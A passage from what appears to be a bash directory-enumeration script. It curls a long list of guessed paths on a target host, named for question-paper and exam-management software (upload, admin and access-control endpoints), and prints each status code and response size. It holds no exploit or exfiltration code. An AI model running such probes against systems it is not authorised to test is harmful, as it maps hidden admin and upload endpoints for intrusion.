         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["OpsTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"OpsTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControlQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControlQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingQPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingQPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SuiteQPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SuiteQPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuiteQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuiteQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AdminTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AdminTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagerQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagerQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderCloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderCloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperManagement/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperManagement/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystemQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystemQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PanelQPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PanelQPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModuleQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModuleQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagerQPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagerQPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystemQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystemQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFileCloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFileCloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ControlQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ControlQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringToolQPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringToolQPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuiteQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuiteQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer-QPHandler/"]: "
